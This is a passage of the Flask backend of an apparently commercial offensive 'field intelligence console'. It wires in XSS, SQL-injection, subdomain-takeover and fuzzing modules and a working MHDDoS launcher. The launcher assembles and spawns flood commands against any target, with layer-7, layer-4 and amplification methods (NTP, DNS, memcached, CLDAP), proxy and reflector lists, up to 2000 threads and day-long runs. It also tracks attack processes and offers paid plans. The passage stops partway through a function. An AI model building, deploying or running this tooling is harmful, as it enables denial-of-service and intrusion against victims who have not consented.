#!/usr/bin/env python3
"""
Oxysintx / Emergens — app.py v5.0.0
═══════════════════════════════════════════════════════════════════════════
Field Intelligence Console — full stack, gunicorn-ready.

Integrated modules
    xss_exploiter v2.0.0    · reflected XSS + WAF bypass + SSE
    sqli_engine v1.0.0      · error/boolean/time/union + cancel
    sniper v2.1.0           · orchestrator + cross-module correlation
    subdomain_takeover v3.0 · 68 providers + confidence scoring
    dirfuzz v2.0.0          · soft-404 + secret scanning + SSE
    http_logger v2.0.0      · ring buffer + anomaly + HAR export
    analytic_manager v2.0.0 · graceful façade
    scan_orchestrator v2.3  · tool registry

Author: Yanxzyx
"""
from __future__ import annotations

import atexit
import base64
import binascii
import hashlib
import json
import logging
import os
import re
import secrets
import signal
import sys
import threading
import time
import uuid
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from functools import wraps
from importlib import import_module
from pathlib import Path
from queue import Empty as QueueEmpty
from subprocess import Popen
from typing import Any, Dict, Iterator, List, Optional, Tuple

import psutil
import requests
from flask import (
    Flask, render_template, request, jsonify, session, redirect,
    send_from_directory, Response, g, stream_with_context,
)
from werkzeug.exceptions import HTTPException

from config import Config
from auth.user_store import (
    UserStore, ensure_default_user, verify_credentials, create_user, get_role,
    list_users, delete_user, DEFAULT_USERNAME, VALID_ROLES,
)
from auth.token_store import token_store
from core.logger_setup import setup_logging
from core.history_store import HistoryStore
from core.system_monitor import get_system_stats
from modules.scan_orchestrator import ScanOrchestrator, TOOL_MAP
from modules.source_viewer import run as fetch_source
from modules.search_user import run as search_user_run
from modules.telegram import (
    connect_bot, disconnect_bot, get_bot_status, update_bot_settings,
    broadcast_message, auto_restart_bot, set_orchestrator, set_history_store,
)
from modules.whatsapp import whatsapp_bp
from ai_chat.chat_handler import ChatHandler


# ═══════════════════════════════════════════════════════════════════════════
# OPTIONAL IMPORTS
# ═══════════════════════════════════════════════════════════════════════════
def _try_import(name: str):
    try:
        return import_module(name), True
    except Exception:
        return None, False


try:
    from modules.downsea import downsea_bp
    _downsea_available = True
except ImportError:
    _downsea_available = False

code_test_module, _testing_available = _try_import("modules.testing")

try:
    from modules.analytic_manager import AnalyticDataManager
    _analytic_available = True
except ImportError:
    AnalyticDataManager = None
    _analytic_available = False

try:
    from modules import xss_exploiter as xss_module
    _xss_available = True
except ImportError:
    xss_module = None
    _xss_available = False

try:
    from modules import sniper as sniper_module
    _sniper_available = True
except ImportError:
    sniper_module = None
    _sniper_available = False

try:
    from modules import subdomain_takeover as takeover_module
    _takeover_available = True
except ImportError:
    takeover_module = None
    _takeover_available = False

try:
    from modules import dirfuzz as dirfuzz_module
    _dirfuzz_available = True
except ImportError:
    dirfuzz_module = None
    _dirfuzz_available = False

try:
    from modules import sqli_engine as sqli_module
    _sqli_available = True
except ImportError:
    sqli_module = None
    _sqli_available = False

try:
    from modules.http_logger import HttpLogger
    _http_logger_available = True
except ImportError:
    HttpLogger = None
    _http_logger_available = False

_quick_menu_bp = None
_quick_menu_available = False
try:
    from modules import quick_menu
    for _attr in ("quick_menu_bp", "bp"):
        if hasattr(quick_menu, _attr):
            _quick_menu_bp = getattr(quick_menu, _attr)
            _quick_menu_available = True
            break
except ImportError:
    pass


# ═══════════════════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════════════════
BANNER = r"""
▓█████  ███▄ ▄███▓▓█████  ██▀███    ▄████ ▓█████  ███▄    █   ██████
▓█   ▀ ▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ ▒██    ▒
▒███   ▓██    ▓██░▒███   ▓██ ░▄█ ▒▒██░▄▄▄░▒███  ▓██  ▀█ ██▒░ ▓██▄
▒▓█  ▄ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  ░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒  ▒   ██▒
░▒████▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒░▒▓███▀▒░▒████▒██░   ▓██░▒██████▒▒
░░ ▒░ ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░ ░▒   ▒ ░░ ▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░ ░  ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░  ░   ░  ░ ░  ░ ░░   ░ ▒░░ ░▒  ░ ░
   ░   ░      ░      ░     ░░   ░ ░ ░   ░    ░     ░   ░ ░ ░  ░  ░
   ░  ░       ░      ░  ░   ░           ░    ░  ░        ░       ░
"""
BANNER_VERSION = "v5.0.0"
BANNER_TAGLINE = "  Field Intelligence Console  ·  Python 3.13  ·  Emergens Ops"


# ═══════════════════════════════════════════════════════════════════════════
# PATHS
# ═══════════════════════════════════════════════════════════════════════════
_PROJECT_ROOT = Path(__file__).resolve().parent
MHDDOS_SCRIPT = _PROJECT_ROOT / "start.py"

_VENV_WIN = _PROJECT_ROOT / ".venv" / "Scripts" / "python.exe"
_VENV_UNIX = _PROJECT_ROOT / ".venv" / "bin" / "python"
PYTHON_EXE = str(_VENV_WIN if _VENV_WIN.exists()
                 else (_VENV_UNIX if _VENV_UNIX.exists() else sys.executable))
PROJECT_ROOT = str(_PROJECT_ROOT)

DATA_DIR        = os.path.join(PROJECT_ROOT, "data")
LOG_DIR         = os.path.join(PROJECT_ROOT, "logs")
UPLOAD_DIR      = os.path.join(DATA_DIR, "uploads")
WORDLIST_DIR    = _PROJECT_ROOT / "wordlist"
MHDDOS_LOG_DIR  = _PROJECT_ROOT / "logs" / "mhddos"
HTTP_LOGGER_DIR = _PROJECT_ROOT / "logs" / "http_logger"

MAX_JSON_BODY_BYTES = 12 * 1024 * 1024
JOB_TTL_DEFAULT     = 1800
HEARTBEAT_INTERVAL  = 10.0
JOB_SWEEP_INTERVAL  = 60.0
SERVER_START_TIME   = time.time()

CORS_ORIGINS = [o.strip() for o in
                (os.getenv("EMERGENS_CORS_ORIGINS", "") or "").split(",")
                if o.strip()]


# ═══════════════════════════════════════════════════════════════════════════
# LOGGING (setup early so all imports log)
# ═══════════════════════════════════════════════════════════════════════════
try:
    setup_logging(Config.SERVER_LOG_FILE)
except Exception:
    logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("oxysintx")


# ═══════════════════════════════════════════════════════════════════════════
# JOB MANAGER
# ═══════════════════════════════════════════════════════════════════════════
class _Job:
    __slots__ = ("job_id", "kind", "target", "status", "created",
                 "started_at", "finished_at", "results", "error",
                 "cancel", "options", "progress", "total", "done", "label")

    def __init__(self, job_id, kind, target, options):
        self.job_id = job_id
        self.kind = kind
        self.target = target
        self.status = "running"
        self.created = time.time()
        self.started_at = datetime.now(timezone.utc).isoformat()
        self.finished_at = None
        self.results = None
        self.error = None
        self.cancel = threading.Event()
        self.options = options
        self.progress = 0
        self.total = 0
        self.done = 0
        self.label = "initializing"

    def to_public(self, *, include_results=False):
        out = {
            "job_id": self.job_id, "kind": self.kind, "target": self.target,
            "status": self.status, "created": self.created,
            "started_at": self.started_at, "finished_at": self.finished_at,
            "progress": self.progress, "done": self.done,
            "total": self.total, "label": self.label, "error": self.error,
        }
        if include_results:
            out["results"] = self.results
        return out


class JobManager:
    def __init__(self, ttl=JOB_TTL_DEFAULT, max_per_kind=3):
        self._jobs: Dict[str, _Job] = {}
        self._lock = threading.RLock()
        self._ttl = float(ttl)
        self._max_per_kind = max_per_kind
        self._sweeper_started = False

    @property
    def max_per_kind(self):
        return self._max_per_kind

    def new_id(self, prefix):
        return f"{prefix}-{uuid.uuid4().hex[:8].upper()}"

    def active_count(self, kind):
        with self._lock:
            return sum(1 for j in self._jobs.values()
                       if j.kind == kind
                       and j.status in ("running", "cancelling"))

    def can_start(self, kind):
        return self.active_count(kind) < self._max_per_kind

    def register(self, job):
        with self._lock:
            self._jobs[job.job_id] = job

    def get(self, job_id):
        with self._lock:
            return self._jobs.get(job_id)

    def list_by_kind(self, kind=None):
        with self._lock:
            return [j for j in self._jobs.values()
                    if kind is None or j.kind == kind]

    def finish(self, job_id, *, results=None, error=None):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job.results = results
            job.error = error
            job.finished_at = datetime.now(timezone.utc).isoformat()
            job.status = ("cancelled" if job.cancel.is_set()
                          else ("failed" if error else "completed"))
            job.progress = 100

    def cancel(self, job_id):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return {"error": "not_found"}
            if job.status not in ("running", "cancelling"):
                return {"error": "job_not_running", "status": job.status}
            job.cancel.set()
            job.status = "cancelling"
            return {"success": True, "job_id": job_id}

    def cancel_all(self, kind=None):
        n = 0
        with self._lock:
            for job in self._jobs.values():
                if kind is not None and job.kind != kind:
                    continue
                if job.status in ("running", "cancelling"):
                    job.cancel.set()
                    job.status = "cancelling"
                    n += 1
        return n

    def update_progress(self, job_id, done, total, label=""):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job.done = done
            job.total = total
            job.label = label or job.label
            job.progress = int((done / total) * 100) if total else 0

    def start_sweeper(self):
        if self._sweeper_started:
            return
        self._sweeper_started = True

        def _loop():
            while True:
                time.sleep(JOB_SWEEP_INTERVAL)
                try:
                    self._sweep()
                except Exception:
                    logger.exception("job sweeper raised")

        threading.Thread(target=_loop, daemon=True, name="job-sweeper").start()

    def _sweep(self):
        cutoff = time.time() - self._ttl
        with self._lock:
            for jid in [k for k, v in self._jobs.items() if v.created < cutoff]:
                self._jobs[jid].cancel.set()
                del self._jobs[jid]


job_manager = JobManager()


# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS
# ═══════════════════════════════════════════════════════════════════════════
ALLOWED_PROXY_FILES = {"http.txt", "socks4.txt", "socks5.txt", "proxies.txt"}
ALLOWED_REFLECTOR_FILES = {"reflectors.txt"}
REQUIRED_L7_FILES = (Path("files") / "useragent.txt", Path("files") / "referers.txt")
VALID_PROXY_TYPES = {0, 1, 4, 5, 6}

_mhddos_processes: Dict[str, Dict[str, Any]] = {}
_mhddos_lock = threading.Lock()
_mhddos_history: List[Dict[str, Any]] = []
_MHDDOS_HISTORY_LIMIT = 500
_MHDDOS_LOG_TAIL_LINES = 40

_MHDDOS_METHODS = {
    "GET","POST","HEAD","CFB","CFBUAM","BYPASS","OVH","STRESS","DYN","SLOW",
    "NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","APACHE","XMLRPC","BOT",
    "BOMB","DOWNLOADER","KILLER","TOR","RHEX","STOMP",
    "TCP","UDP","SYN","VSE","MINECRAFT","MCBOT","CONNECTION","CPS","FIVEM",
    "FIVEM-TOKEN","TS3","MCPE","ICMP","OVH-UDP","MEM","NTP","DNS","ARD",
    "CLDAP","CHAR","RDP",
}
_MHDDOS_LAYER7 = {
    "GET","POST","HEAD","CFB","CFBUAM","BYPASS","OVH","STRESS","DYN","SLOW",
    "NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","APACHE","XMLRPC","BOT",
    "BOMB","DOWNLOADER","KILLER","TOR","RHEX","STOMP",
}
_MHDDOS_LAYER4 = {
    "TCP","UDP","SYN","VSE","MINECRAFT","MCBOT","CONNECTION","CPS","FIVEM",
    "FIVEM-TOKEN","TS3","MCPE","ICMP","OVH-UDP","MEM","NTP","DNS","ARD",
    "CLDAP","CHAR","RDP",
}
_MHDDOS_AMP = {"MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP"}


def _mhddos_build_command(method, target, threads, duration,
                          proxy_type=0, proxy_file="proxies.txt",
                          rpc=1, debug=False, reflector_file=""):
    cmd = [PYTHON_EXE, str(MHDDOS_SCRIPT)]
    safe_proxy = Path(proxy_file or "").name or "proxies.txt"
    if safe_proxy not in ALLOWED_PROXY_FILES:
        safe_proxy = "proxies.txt"
    safe_reflector = Path(reflector_file or "").name
    if safe_reflector and safe_reflector not in ALLOWED_REFLECTOR_FILES:
        safe_reflector = "reflectors.txt"
    threads = max(1, min(int(threads), 2000))
    duration = max(1, min(int(duration), 86400))
    rpc = max(1, min(int(rpc), 10000))
    proxy_type = int(proxy_type)
    if proxy_type not in VALID_PROXY_TYPES:
        proxy_type = 0

    if method in _MHDDOS_LAYER7:
        url = target if target.startswith(("http://", "https://")) else f"http://{target}"
        cmd.extend([method, url, str(proxy_type), str(threads),
                    safe_proxy, str(rpc), str(duration)])
        if debug:
            cmd.append("debug")
    else:
        ip_port = target
        if not re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d+$", ip_port):
            try:
                from socket import gethostbyname
                hostname, port = ip_port.rsplit(":", 1)
                ip_port = f"{gethostbyname(hostname)}:{port}"
            except Exception:
                pass
        cmd.extend([method, ip_port, str(threads), str(duration)])
        if method in _MHDDOS_AMP:
            cmd.append(safe_reflector or "reflectors.txt")
        else:
            cmd.extend([str(proxy_type), safe_proxy])
        if debug:
            cmd.append("debug")
    return cmd


def _mhddos_start_attack(attack_id, method, target, threads, duration,
                         proxy_type, proxy_file, rpc, reflector_file, debug):
    cmd = _mhddos_build_command(method, target, threads, duration,
                                proxy_type, proxy_file, rpc, debug, reflector_file)
    MHDDOS_LOG_DIR.mkdir(parents=True, exist_ok=True)
    log_path = MHDDOS_LOG_DIR / f"{attack_id}.log"
    try:
        log_fh = open(log_path, "w", encoding="utf-8", errors="replace")
        log_fh.write("$ " + " ".join(cmd) + "\n\n")
        log_fh.flush()
    except OSError as e:
        return {"success": False, "error": f"cannot_open_log: {e}"}
    try:
        process = Popen(cmd, stdout=log_fh, stderr=log_fh, text=True,
                        cwd=PROJECT_ROOT)
    except Exception as e:
        try:
            log_fh.close()
        except Exception:
            pass
        return {"success": False, "error": str(e)}

    now = datetime.now(timezone.utc).isoformat()
    with _mhddos_lock:
        _mhddos_processes[attack_id] = {
            "process": process, "log_fh": log_fh, "log_path": str(log_path),
            "method": method, "target": target, "threads": threads,
            "duration": duration, "proxy_type": proxy_type,
            "proxy_file": proxy_file, "rpc": rpc,
            "reflector_file": reflector_file, "debug": debug,
            "started_at": now, "status": "running",
        }
        _mhddos_history.append({
            "attack_id": attack_id, "method": method, "target": target,
            "threads": threads, "duration": duration,
            "started_at": now, "status": "running",
        })
        if len(_mhddos_history) > _MHDDOS_HISTORY_LIMIT:
            del _mhddos_history[:-_MHDDOS_HISTORY_LIMIT]

    threading.Thread(target=_mhddos_monitor, args=(attack_id,),
                     daemon=True).start()
    return {"success": True, "attack_id": attack_id,
            "argv": cmd, "log": str(log_path)}


def _mhddos_read_log_tail(log_path, lines=_MHDDOS_LOG_TAIL_LINES):
    try:
        with open(log_path, "r", encoding="utf-8", errors="replace") as f:
            return "".join(f.readlines()[-lines:])
    except OSError:
        return ""


def _mhddos_monitor(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info:
            return
        process = info["process"]
        log_fh = info.get("log_fh")
        log_path = info.get("log_path")

    returncode = None
    try:
        process.wait(timeout=info["duration"] + 15)
        returncode = process.returncode
        status = "completed" if returncode == 0 else "failed"
    except Exception:
        status = "timeout"
        try:
            process.kill()
        except Exception:
            pass

    try:
        if log_fh and not log_fh.closed:
            log_fh.flush()
            log_fh.close()
    except Exception:
        pass

    tail = ""
    if status in ("failed", "timeout") and log_path:
        tail = _mhddos_read_log_tail(log_path)

    ended_at = datetime.now(timezone.utc).isoformat()
    with _mhddos_lock:
        entry = _mhddos_processes.get(attack_id)
        if entry:
            entry["status"] = status
            entry["ended_at"] = ended_at
            entry["returncode"] = returncode
            if tail:
                entry["error_tail"] = tail
        for h in _mhddos_history:
            if h["attack_id"] == attack_id:
                h["status"] = status
                h["ended_at"] = ended_at
                if returncode is not None:
                    h["returncode"] = returncode
                break


def _mhddos_stop_attack(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info:
            return {"success": False, "error": "not_found"}
        try:
            if os.name == "nt":
                info["process"].kill()
            else:
                info["process"].send_signal(signal.SIGTERM)
            info["status"] = "stopped"
            info["ended_at"] = datetime.now(timezone.utc).isoformat()
        except Exception as e:
            return {"success": False, "error": str(e)}
        for entry in _mhddos_history:
            if entry["attack_id"] == attack_id:
                entry["status"] = "stopped"
                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
                break
    return {"success": True}


def _mhddos_stop_all():
    stopped = 0
    with _mhddos_lock:
        for info in _mhddos_processes.values():
            if info["status"] == "running":
                try:
                    info["process"].kill()
                    info["status"] = "stopped"
                    info["ended_at"] = datetime.now(timezone.utc).isoformat()
                    stopped += 1
                except Exception:
                    pass
    return {"success": True, "stopped": stopped}


_MHDDOS_SERIAL_FIELDS = (
    "attack_id", "method", "target", "threads", "duration",
    "proxy_type", "proxy_file", "rpc", "reflector_file", "debug",
    "status", "started_at", "ended_at", "returncode", "error_tail", "log_path",
)


def _serialise_mhddos(entry, include_runtime=False):
    if not entry:
        return None
    out = {k: entry[k] for k in _MHDDOS_SERIAL_FIELDS if k in entry}
    if include_runtime:
        process = entry.get("process")
        out["pid"] = getattr(process, "pid", None) if process else None
        try:
            started = entry.get("started_at")
            duration = int(entry.get("duration") or 0)
            if started and duration > 0:
                dt = datetime.fromisoformat(started.replace("Z", "+00:00"))
                if dt.tzinfo is None:
                    dt = dt.replace(tzinfo=timezone.utc)
                elapsed = max(0, int((datetime.now(timezone.utc) - dt).total_seconds()))
                out["elapsed"] = elapsed
                out["remaining"] = max(0, duration - elapsed)
                out["progress_pct"] = min(100, round(elapsed / duration * 100, 1))
        except Exception:
            pass
    return out


def _mhddos_get_status(attack_id=None):
    with _mhddos_lock:
        if attack_id:
            e = _mhddos_processes.get(attack_id)
            return _serialise_mhddos(e, True) if e else None
        return {
            "running": [_serialise_mhddos(v, True)
                        for v in _mhddos_processes.values()
                        if v.get("status") == "running"],
            "history": [_serialise_mhddos(h, False)
                        for h in _mhddos_history[-50:]],
            "available": True,
            "methods": sorted(_MHDDOS_METHODS),
            "layer7": sorted(_MHDDOS_LAYER7),
            "layer4": sorted(_MHDDOS_LAYER4),
            "amplification": sorted(_MHDDOS_AMP),
        }


# ═══════════════════════════════════════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════════════════════════════════════
firebaseConfig = {
    "apiKey": os.getenv("FIREBASE_API_KEY", ""),
    "authDomain": os.getenv("FIREBASE_AUTH_DOMAIN", "emergens-auth.firebaseapp.com"),
    "databaseURL": os.getenv("FIREBASE_DB_URL", "https://emergens-auth-default-rtdb.firebaseio.com"),
    "projectId": os.getenv("FIREBASE_PROJECT_ID", "emergens-auth"),
    "storageBucket": os.getenv("FIREBASE_STORAGE_BUCKET", "emergens-auth.firebasestorage.app"),
    "messagingSenderId": os.getenv("FIREBASE_SENDER_ID", ""),
    "appId": os.getenv("FIREBASE_APP_ID", ""),
}

app = Flask(__name__)
app.secret_key = Config.SECRET_KEY
app.permanent_session_lifetime = timedelta(hours=8)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.getenv("SESSION_COOKIE_SECURE", "0") == "1",
    MAX_CONTENT_LENGTH=MAX_JSON_BODY_BYTES,
    JSON_SORT_KEYS=False,
)

app.register_blueprint(whatsapp_bp)
if _downsea_available:
    app.register_blueprint(downsea_bp)
if _quick_menu_available and _quick_menu_bp is not None:
    app.register_blueprint(_quick_menu_bp)


# ═══════════════════════════════════════════════════════════════════════════
# BACKING SERVICES
# ═══════════════════════════════════════════════════════════════════════════
history_store = HistoryStore()
chat_handler = ChatHandler(api_key=Config.ANTHROPIC_API_KEY)
user_store = UserStore()
scan_orchestrator = ScanOrchestrator()

set_orchestrator(scan_orchestrator)
set_history_store(history_store)


# ═══════════════════════════════════════════════════════════════════════════
# HTTP LOGGER
# ═══════════════════════════════════════════════════════════════════════════
http_logger = None
if _http_logger_available:
    try:
        HTTP_LOGGER_DIR.mkdir(parents=True, exist_ok=True)
        http_logger = HttpLogger(
            max_entries=5000, max_body_bytes=8192,
            persist_dir=HTTP_LOGGER_DIR,
        )
        http_logger.attach(app)
        logger.info("HTTP Request Logger attached (buffer=5000)")
    except Exception as e:
        http_logger = None
        logger.error("HTTP Request Logger failed: %s", e)


# ═══════════════════════════════════════════════════════════════════════════
# DIRECTORIES
# ═══════════════════════════════════════════════════════════════════════════
for d in ["userdata", "listschool", os.path.join("static", "data"),
          "files", os.path.join("files", "proxies"),
          os.path.join("logs", "mhddos"), "wordlist"]:
    os.makedirs(os.path.join(PROJECT_ROOT, d), exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)


# ═══════════════════════════════════════════════════════════════════════════
# JSON I/O
# ═══════════════════════════════════════════════════════════════════════════
_json_locks: Dict[str, threading.Lock] = defaultdict(threading.Lock)


def _load_json(name, default):
    path = os.path.join(DATA_DIR, f"{name}.json")
    with _json_locks[name]:
        if not os.path.exists(path):
            return default
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Corrupt JSON %s: %s", path, exc)
            bak = path + ".bak"
            if os.path.exists(bak):
                try:
                    with open(bak, "r", encoding="utf-8") as f:
                        return json.load(f)
                except Exception:
                    pass
            return default


def _save_json(name, data):
    path = os.path.join(DATA_DIR, f"{name}.json")
    tmp = path + ".tmp"
    bak = path + ".bak"
    with _json_locks[name]:
        if os.path.exists(path):
            try:
                os.replace(path, bak)
            except OSError:
                pass
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.flush()
            try:
                os.fsync(f.fileno())
            except OSError:
                pass
        os.replace(tmp, path)


def _json_lock(name):
    return _json_locks[name]


def _now_iso():
    return datetime.now(timezone.utc).isoformat()


def _client_ip():
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    real = request.headers.get("X-Real-IP", "").strip()
    return real or request.remote_addr or "unknown"


def _json_body():
    data = request.get_json(silent=True)
    return data if isinstance(data, dict) else {}


# ═══════════════════════════════════════════════════════════════════════════
# REQUEST MIDDLEWARE
# ═══════════════════════════════════════════════════════════════════════════
_request_log_lock = threading.Lock()
_request_timestamps: List[float] = []
_total_requests_seen = 0
_net_traffic_started_at = time.time()
_prev_net = {"t": 0.0, "total": 0}


@app.before_request
def _before_mw():
    global _total_requests_seen
    g.request_id = request.headers.get("X-Request-ID") or uuid.uuid4().hex[:12]
    g.request_started = time.monotonic()
    with _request_log_lock:
        now = time.time()
        _total_requests_seen += 1
        _request_timestamps.append(now)
        cutoff = now - 60
        while _request_timestamps and _request_timestamps[0] < cutoff:
            _request_timestamps.pop(0)


@app.after_request
def _after_mw(response):
    req_id = getattr(g, "request_id", None)
    if req_id:
        response.headers.setdefault("X-Request-ID", req_id)
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "SAMEORIGIN")
    response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
    if os.getenv("EMERGENS_HSTS", "0") == "1":
        response.headers.setdefault("Strict-Transport-Security",
                                     "max-age=31536000; includeSubDomains")
    origin = request.headers.get("Origin")
    if origin and (origin in CORS_ORIGINS or "*" in CORS_ORIGINS):
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Vary"] = "Origin"
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Access-Control-Allow-Headers"] = \
            "Content-Type, Authorization, X-API-Key, X-Request-ID"
        response.headers["Access-Control-Allow-Methods"] = \
            "GET, POST, PUT, DELETE, OPTIONS"
    if 500 <= response.status_code < 600:
        elapsed = round((time.monotonic() -
                         getattr(g, "request_started", time.monotonic())) * 1000, 1)
        logger.error("[%s] %s %s → %s in %sms (ip=%s ua=%s)",
                     req_id, request.method, request.path,
                     response.status_code, elapsed, _client_ip(),
                     request.headers.get("User-Agent", "-")[:80])
    return response


@app.before_request
def _handle_preflight():
    if request.method == "OPTIONS" and \
            request.headers.get("Access-Control-Request-Method"):
        return ("", 204)


def _inbound_stats():
    with _request_log_lock:
        return _total_requests_seen, len(_request_timestamps)


# ═══════════════════════════════════════════════════════════════════════════
# ERROR HANDLERS
# ═══════════════════════════════════════════════════════════════════════════
def _wants_json():
    return (request.path.startswith("/api/")
            or "application/json" in request.headers.get("Accept", "").lower())


def _err(code, message, **extra):
    payload = {"error": message, "code": code}
    if hasattr(g, "request_id"):
        payload["request_id"] = g.request_id
    payload.update(extra)
    return jsonify(payload), code


@app.errorhandler(400)
def _e400(e): return _err(400, "bad_request") if _wants_json() else e
@app.errorhandler(401)
def _e401(e): return _err(401, "unauthorized") if _wants_json() else e
@app.errorhandler(403)
def _e403(e): return _err(403, "forbidden") if _wants_json() else e
@app.errorhandler(405)
def _e405(e): return _err(405, "method_not_allowed") if _wants_json() else e
@app.errorhandler(413)
def _e413(e): return _err(413, "payload_too_large", max_bytes=MAX_JSON_BODY_BYTES)
@app.errorhandler(429)
def _e429(e): return _err(429, "too_many_requests")
@app.errorhandler(500)
def _e500(e):
    logger.exception("500 on %s %s", request.method, request.path)
    return _err(500, "internal_server_error")
@app.errorhandler(502)
def _e502(e): return _err(502, "bad_gateway")
@app.errorhandler(503)
def _e503(e): return _err(503, "service_unavailable")
@app.errorhandler(504)
def _e504(e): return _err(504, "gateway_timeout")


@app.errorhandler(HTTPException)
def _e_http(e):
    if _wants_json():
        return _err(e.code or 500, (e.name or "error").lower().replace(" ", "_"))
    return e


@app.errorhandler(Exception)
def _e_uncaught(e):
    logger.exception("Uncaught on %s %s", request.method, request.path)
    if _wants_json():
        return _err(500, "internal_server_error", detail=type(e).__name__)
    raise


# ═══════════════════════════════════════════════════════════════════════════
# SSE
# ═══════════════════════════════════════════════════════════════════════════
def sse_response(generator, heartbeat=HEARTBEAT_INTERVAL):
    def _gen():
        try:
            yield ": connected\n\n"
            last_hb = time.time()
            for event in generator:
                if isinstance(event, (str, bytes)):
                    if isinstance(event, bytes):
                        event = event.decode("utf-8", "replace")
                    yield event if event.endswith("\n\n") else f"{event}\n\n"
                    last_hb = time.time()
                    continue
                now = time.time()
                if now - last_hb > heartbeat:
                    yield (f"data: {json.dumps({'type': 'heartbeat', 'elapsed': round(now - last_hb, 2)})}\n\n")
                    last_hb = now
                if not isinstance(event, dict):
                    event = {"type": "message", "data": event}
                yield f"data: {json.dumps(event, ensure_ascii=False, default=str)}\n\n"
                if event.get("type") in ("complete", "result", "error"):
                    yield ": flush\n\n"
                last_hb = time.time()
        except GeneratorExit:
            return
        except Exception as e:
            logger.exception("SSE stream raised")
            try:
                yield f"data: {json.dumps({'type': 'error', 'message': str(e)})}\n\n"
            except Exception:
                pass

    return Response(
        stream_with_context(_gen()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache, no-transform",
            "Pragma": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )


# ═══════════════════════════════════════════════════════════════════════════
# API KEY HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def _hash_api_key(raw_key):
    return hashlib.sha256(raw_key.encode("utf-8")).hexdigest()


def _public_key_view(k):
    return {
        "prefix": k.get("prefix") or k.get("key_prefix"),
        "created": k.get("created_at") or k.get("created"),
        "last_used": k.get("last_used"),
        "request_count": k.get("request_count", 0),
    }


def _record_server_activity(prefix, username, req):
    reported = (req.headers.get("X-Server-Name")
                or (req.get_json(silent=True) or {}).get("server_name")
                or None)
    ip = req.headers.get("X-Forwarded-For", req.remote_addr) or "unknown"
    with _json_lock("servers"):
        servers = _load_json("servers", [])
        entry = next((s for s in servers if s["key_prefix"] == prefix), None)
        if entry:
            entry["last_seen"] = _now_iso()
            entry["requests"] = entry.get("requests", 0) + 1
            entry["ip"] = ip
            if reported:
                entry["server_name"] = reported
        else:
            servers.append({
                "server_name": reported or f"Unnamed ({prefix})",
                "key_prefix": prefix, "ip": ip,
                "last_seen": _now_iso(), "requests": 1,
            })
        _save_json("servers", servers)


def _find_api_key_owner(raw_key):
    try:
        keys = user_store.get_api_keys()
    except Exception:
        keys = []
    key_hash = _hash_api_key(raw_key)
    for k in keys:
        stored = k.get("key_hash") or k.get("hash")
        if stored and stored == key_hash:
            return k
        if k.get("key") == raw_key:
            return k
    return None


def _api_key_required(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        raw = request.headers.get("X-API-Key", "").strip()
        if not raw:
            return jsonify({"error": "Missing X-API-Key"}), 401
        rec = _find_api_key_owner(raw)
        if not rec:
            return jsonify({"error": "Invalid API key"}), 401
        prefix = rec.get("prefix") or rec.get("key_prefix") or raw[:20]
        owner = rec.get("owner_username") or rec.get("username") or "unknown"
        try:
            user_store.touch_api_key(prefix)
        except Exception:
            pass
        _record_server_activity(prefix, owner, request)
        g.api_key_owner = owner
        return fn(*a, **kw)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# PAYMENT
# ═══════════════════════════════════════════════════════════════════════════
PAYMENT_DATA_FILE = os.path.join(PROJECT_ROOT, "payment_data.json")
PAYMENT_PLANS_FILE = os.path.join(PROJECT_ROOT, "payment_plans.json")

_default_plans = {
    "free": {"name": "Free Plan", "price": "0.00"},
    "starter": {"name": "Starter Plan", "price": "9.00"},
    "standard": {"name": "Standard Plan", "price": "25.00"},
    "team": {"name": "Team Plan", "price": "49.00"},
    "enterprise": {"name": "Enterprise Plan", "price": "99.00"},
}
_payment_lock = threading.Lock()


def _load_plans():
    if os.path.exists(PAYMENT_PLANS_FILE):
        try:
            with open(PAYMENT_PLANS_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return _default_plans.copy()


def _save_plans(plans):
    try:
        with _payment_lock:
            with open(PAYMENT_PLANS_FILE, "w") as f:
                json.dump(plans, f, indent=2)
        return True
    except IOError:
        return False


def _load_payments():
